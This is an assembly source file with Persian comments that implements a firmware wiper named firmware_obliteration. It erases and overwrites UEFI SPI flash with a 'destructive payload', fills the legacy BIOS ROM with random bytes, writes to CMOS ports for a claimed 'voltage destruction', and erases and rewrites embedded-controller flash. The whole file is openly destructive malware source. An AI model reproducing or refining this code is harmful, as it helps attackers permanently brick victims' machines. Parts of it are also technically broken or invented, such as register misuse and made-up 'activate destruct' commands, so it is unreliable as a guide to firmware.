%include "scorch_macros.inc"

global firmware_obliteration
firmware_obliteration:
    ; شناسایی نوع فرم‌ور
    call detect_firmware_type
    
    ; تخریب UEFI
    cmp rax, FIRMWARE_UEFI
    je .uefi_destroy
    
    ; تخریب BIOS سنتی
    call bios_destruct
    jmp .end
    
.uefi_destroy:
    call uefi_obliterate
    
.end:
    ; تخریب Embedded Controller
    call ec_destroy
    ret

; تخریب UEFI پیشرفته
uefi_obliterate:
    ; دسترسی مستقیم به حافظه SPI
    mov rcx, SPI_BASE_ADDR
    
    ; غیرفعال‌سازی حفاظت
    mov al, SPI_CMD_WREN
    mov [rcx + SPI_CMD_REG], al
    call spi_wait
    
    ; پاک‌سازی کامل
    mov al, SPI_CMD_CHIP_ERASE
    mov [rcx + SPI_CMD_REG], al
    call spi_wait_long
    
    ; نوشتن پیلود مخرب
    mov rsi, destruct_payload
    mov rdi, 0
    mov rcx, DESTRUCT_PAYLOAD_SIZE
.write_loop:
    mov al, SPI_CMD_PAGE_PROGRAM
    mov [rcx + SPI_CMD_REG], al
    mov [rcx + SPI_ADDR_REG], rdi
    
    ; نوشتن 256 بایت
    push rcx
    mov rcx, 256
    rep movsb
    pop rcx
    
    add rdi, 256
    loop .write_loop
    
    ; فعال‌سازی تخریب
    mov al, SPI_CMD_ACTIVATE_DESTRUCT
    mov [rcx + SPI_CMD_REG], al
    call spi_wait
    ret

; تخریب BIOS سنتی
bios_destruct:
    ; نوشتن مستقیم بر روی حافظه ROM
    mov rdi, BIOS_BASE_ADDR
    mov rcx, BIOS_SIZE
.destruct_loop:
    rdrand rax
    mov [rdi], al
    inc rdi
    loop .destruct_loop
    
    ; فعال‌سازی تخریب ولتاژی
    mov dx, 0x70
    mov al, 0x0F
    out dx, al
    mov dx, 0x71
    mov al, 0xFF
    out dx, al
    ret

; تخریب Embedded Controller
ec_destroy:
    ; فعال‌سازی حالت برنامه‌ریزی
    mov dx, EC_INDEX_PORT
    mov al, EC_UNLOCK_SEQ1
    out dx, al
    mov dx, EC_DATA_PORT
    mov al, EC_UNLOCK_SEQ2
    out dx, al
    
    ; پاک‌سازی حافظه فلش
    mov dx, EC_INDEX_PORT
    mov al, EC_FLASH_ERASE_CMD
    out dx, al
    call ec_wait
    
    ; نوشتن داده‌های مخرب
    mov rsi, ec_destruct_payload
    mov rcx, EC_DESTRUCT_SIZE
.write_ec:
    mov dx, EC_INDEX_PORT
    mov al, EC_ADDR_HIGH
    out dx, al
    mov dx, EC_DATA_PORT
    mov al, [rsi+1]
    out dx, al
    
    mov dx, EC_INDEX_PORT
    mov al, EC_ADDR_LOW
    out dx, al
    mov dx, EC_DATA_PORT
    mov al, [rsi]
    out dx, al
    
    mov dx, EC_INDEX_PORT
    mov al, EC_DATA_CMD
    out dx, al
    mov dx, EC_DATA_PORT
    mov al, [rsi+2]
    out dx, al
    
    add rsi, 3
    loop .write_ec
    
    ; فعال‌سازی تخریب
    mov dx, EC_INDEX_PORT
    mov al, EC_ACTIVATE_DESTRUCT
    out dx, al
    ret
    